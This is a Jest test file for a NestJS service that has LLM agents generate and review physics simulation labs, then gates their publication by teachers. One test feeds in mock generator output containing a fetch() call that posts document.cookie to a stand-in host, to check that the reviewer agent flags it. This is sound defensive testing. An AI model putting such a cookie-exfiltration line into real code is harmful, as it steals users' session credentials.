import { Test, TestingModule } from '@nestjs/testing';
import type { User } from '@prisma/client';
import { LlmService } from '../common/llm/llm.service';
import { ApiError } from '../common/errors/api-error';
import { MaterialsService } from '../materials/materials.service';
import { PrismaService } from '../prisma/prisma.service';
import { LabsService } from './labs.service';

const mockChat = jest.fn();
const mockSearchChunks = jest.fn();
const mockCourseOfferingFindFirst = jest.fn();
const mockLabCreate = jest.fn();
const mockLabUpdate = jest.fn();
const mockLabFindFirst = jest.fn();
const mockLabFindMany = jest.fn();

const teacher = {
  id: 'teacher-0001',
  organizationId: 'org-0001',
  role: 'TEACHER',
} as unknown as User;

const student = {
  id: 'student-0001',
  organizationId: 'org-0001',
  role: 'STUDENT',
} as unknown as User;

const offering = { id: 'offering-0001', organizationId: 'org-0001' };
const labRow = {
  id: 'lab-0001',
  organizationId: 'org-0001',
  courseOfferingId: 'offering-0001',
  createdBy: 'teacher-0001',
  topic: 'pendulums',
  status: 'GENERATING',
  generatedCode: null,
  reviewApproved: null,
  reviewFlags: null,
  teacherNotes: null,
  publishedAt: null,
  createdAt: new Date('2026-08-12T10:00:00Z'),
};

describe('LabsService', () => {
  let service: LabsService;

  beforeEach(async () => {
    jest.clearAllMocks();

    mockCourseOfferingFindFirst.mockResolvedValue(offering);
    mockLabCreate.mockResolvedValue(labRow);
    mockLabFindFirst.mockResolvedValue(labRow);
    mockLabUpdate.mockImplementation(
      (args: { data?: Record<string, unknown> }) =>
        Promise.resolve({ ...labRow, ...(args.data ?? {}) }),
    );
    mockLabFindMany.mockResolvedValue([]);

    const module: TestingModule = await Test.createTestingModule({
      providers: [
        LabsService,
        { provide: LlmService, useValue: { chat: mockChat } },
        {
          provide: MaterialsService,
          useValue: { searchChunks: mockSearchChunks },
        },
        {
          provide: PrismaService,
          useValue: {
            courseOffering: { findFirst: mockCourseOfferingFindFirst },
            lab: {
              create: mockLabCreate,
              update: mockLabUpdate,
              findFirst: mockLabFindFirst,
              findMany: mockLabFindMany,
            },
          },
        },
      ],
    }).compile();

    service = module.get<LabsService>(LabsService);
  });

  describe('generate', () => {
    it('returns a "not grounded" result and never invokes either agent when no curriculum material matches', async () => {
      mockSearchChunks.mockResolvedValue([]);

      const result = await service.generate(teacher, {
        courseOfferingId: 'offering-0001',
        topic: 'quantum tunneling',
      });

      expect(result.grounded).toBe(false);
      expect(result.labId).toBeNull();
      expect(result.status).toBeNull();
      expect(result.message).toContain('No curriculum material');
      // The reviewer agent (and the generator) must never run without grounding.
      expect(mockChat).not.toHaveBeenCalled();
      expect(mockLabCreate).not.toHaveBeenCalled();
    });

    it('flags mocked generator output containing a forbidden fetch call, lands on AI_REVIEW_FAILED and never reaches PENDING_TEACHER_REVIEW', async () => {
      mockSearchChunks.mockResolvedValue([
        {
          id: 'chunk-1',
          content: 'A pendulum swings with period 2π√(L/g).',
          materialTitle: 'Physics Ch 4',
          chapterTitle: null,
          distance: 0.1,
        },
      ]);
      const maliciousCode =
        "const engine = Matter.Engine.create(); fetch('https://evil.example/exfil', { method: 'POST', body: document.cookie });";
      mockChat
        .mockResolvedValueOnce(JSON.stringify({ code: maliciousCode }))
        .mockResolvedValueOnce(
          JSON.stringify({
            approved: false,
            flags: [
              "Code contains a fetch('https://evil.example/exfil') call — forbidden API.",
            ],
            reasoning:
              'The generated code calls fetch(), which the sandbox constraints forbid.',
          }),
        );

      const result = await service.generate(teacher, {
        courseOfferingId: 'offering-0001',
        topic: 'pendulums',
      });

      // The reviewer agent saw the exact code that contained the forbidden
      // pattern — this is the "reviewer flags it" assertion.
      expect(mockChat).toHaveBeenNthCalledWith(
        2,
        expect.any(String),
        expect.stringContaining(maliciousCode),
      );
      expect(result.grounded).toBe(true);
      expect(result.status).toBe('AI_REVIEW_FAILED');
      expect(result.reviewApproved).toBe(false);
      expect(result.reviewFlags?.flags).toEqual([
        expect.stringContaining("fetch('https://evil.example/exfil')"),
      ]);
      expect(result.labId).toBe('lab-0001');
      // The lab row records the rejected review and the raw code — but its
      // status must NEVER be PENDING_TEACHER_REVIEW.
      const updateCalls = mockLabUpdate.mock.calls as [
        { where: { id: string }; data: Record<string, unknown> },
      ][];
      expect(updateCalls).toHaveLength(1);
      expect(updateCalls[0][0].data).toEqual({
        status: 'AI_REVIEW_FAILED',
        reviewApproved: false,
        generatedCode: maliciousCode,
        reviewFlags: {
          flags: [
            "Code contains a fetch('https://evil.example/exfil') call — forbidden API.",
          ],
          reasoning:
            'The generated code calls fetch(), which the sandbox constraints forbid.',
        },
      });
      expect(result.status).not.toBe('PENDING_TEACHER_REVIEW');
    });

    it('treats a reviewer "approved: true" with non-empty flags as not approved (deterministic guard)', async () => {
      mockSearchChunks.mockResolvedValue([
        {
          id: 'chunk-1',
          content: 'Momentum is conserved.',
          materialTitle: 'Physics Ch 1',
          chapterTitle: null,
          distance: 0.2,
        },
      ]);
      mockChat
        .mockResolvedValueOnce(
          JSON.stringify({ code: 'Matter.Engine.create()' }),
        )
        .mockResolvedValueOnce(
          JSON.stringify({
            approved: true,
            flags: ['Suspicious string concatenation detected.'],
            reasoning: 'reported clean but a minor flag was kept',
          }),
        );

      const result = await service.generate(teacher, {
        courseOfferingId: 'offering-0001',
        topic: 'momentum',
      });

      expect(result.status).toBe('AI_REVIEW_FAILED');
      expect(result.reviewApproved).toBe(false);
    });

    it('marks the lab AI_REVIEW_FAILED with a truthful flag when the agent pipeline throws', async () => {
      mockSearchChunks.mockResolvedValue([
        {
          id: 'chunk-1',
          content: 'Bodies fall at 9.8 m/s².',
          materialTitle: 'Physics Ch 2',
          chapterTitle: null,
          distance: 0.15,
        },
      ]);
      mockChat.mockRejectedValue(new Error('provider exploded'));

      const result = await service.generate(teacher, {
        courseOfferingId: 'offering-0001',
        topic: 'free fall',
      });

      expect(result.status).toBe('AI_REVIEW_FAILED');
      expect(result.reviewApproved).toBe(false);
      expect(result.reviewFlags?.flags).toEqual([
        'The AI generation or review pipeline failed.',
      ]);
    });
  });

  describe('publish', () => {
    it.each(['GENERATING', 'AI_REVIEW_FAILED'])(
      'rejects publishing from %s',
      async (status) => {
        mockLabFindFirst.mockResolvedValue({ ...labRow, status });

        await expect(
          service.publish(teacher, 'lab-0001'),
        ).rejects.toMatchObject({ code: 'LAB_NOT_PUBLISHABLE' });
        expect(mockLabUpdate).not.toHaveBeenCalled();
      },
    );

    it('publishes only from PENDING_TEACHER_REVIEW', async () => {
      mockLabFindFirst.mockResolvedValue({
        ...labRow,
        status: 'PENDING_TEACHER_REVIEW',
      });

      const result = await service.publish(teacher, 'lab-0001');

      const updateCalls = mockLabUpdate.mock.calls as [
        { where: { id: string }; data: Record<string, unknown> },
      ][];
      expect(updateCalls[0][0].data.status).toBe('PUBLISHED');
      expect(updateCalls[0][0].data.publishedAt).toBeInstanceOf(Date);
      expect(result.status).toBe('PUBLISHED');
    });

    it('returns LAB_NOT_FOUND for labs the teacher does not own', async () => {
      mockLabFindFirst.mockResolvedValue(null);

      await expect(service.publish(teacher, 'lab-0001')).rejects.toMatchObject({
        code: 'LAB_NOT_FOUND',
      });
    });
  });

  describe('reject', () => {
    it('rejects any pending status with optional notes', async () => {
      mockLabFindFirst.mockResolvedValue({
        ...labRow,
        status: 'AI_REVIEW_FAILED',
      });

      const result = await service.reject(
        teacher,
        'lab-0001',
        'flawed physics',
      );

      const updateCalls = mockLabUpdate.mock.calls as [
        { where: { id: string }; data: Record<string, unknown> },
      ][];
      expect(updateCalls[0][0].data).toEqual({
        status: 'REJECTED',
        teacherNotes: 'flawed physics',
      });
      expect(result.status).toBe('REJECTED');
    });

    it('rejects REJECTED/PUBLISHED labs (final statuses are not rejectable)', async () => {
      mockLabFindFirst.mockResolvedValue({ ...labRow, status: 'REJECTED' });

      await expect(service.reject(teacher, 'lab-0001')).rejects.toMatchObject({
        code: 'LAB_NOT_REJECTABLE',
      });
    });
  });

  describe('student scoping', () => {
    it('lists only PUBLISHED labs, scoped to the student approved enrollments', async () => {
      mockLabFindMany.mockResolvedValue([
        { ...labRow, status: 'PUBLISHED', publishedAt: new Date() },
      ]);

      const labs = await service.listForUser(student, 'offering-0001');

      const findManyCalls = mockLabFindMany.mock.calls as [
        { where: Record<string, unknown> },
      ][];
      expect(findManyCalls[0][0].where).toEqual({
        organizationId: 'org-0001',
        status: 'PUBLISHED',
        courseOfferingId: 'offering-0001',
        courseOffering: {
          section: {
            enrollments: {
              some: { studentId: 'student-0001', status: 'APPROVED' },
            },
          },
        },
      });
      expect(labs).toHaveLength(1);
      expect(labs[0].status).toBe('PUBLISHED');
    });

    it('never returns a non-published lab to a student, even via direct id', async () => {
      mockLabFindFirst.mockResolvedValue({
        ...labRow,
        status: 'PENDING_TEACHER_REVIEW',
      });

      await expect(service.getForUser(student, 'lab-0001')).rejects.toThrow(
        ApiError,
      );
      await expect(
        service.getForUser(student, 'lab-0001'),
      ).rejects.toMatchObject({ code: 'LAB_NOT_PUBLISHED' });
    });

    it('allows a student to retrieve a PUBLISHED lab', async () => {
      mockLabFindFirst.mockResolvedValue({
        ...labRow,
        status: 'PUBLISHED',
        generatedCode: 'Matter.Engine.create()',
      });

      const lab = await service.getForUser(student, 'lab-0001');

      expect(lab.status).toBe('PUBLISHED');
      expect(lab.generatedCode).toBe('Matter.Engine.create()');
    });
  });
});
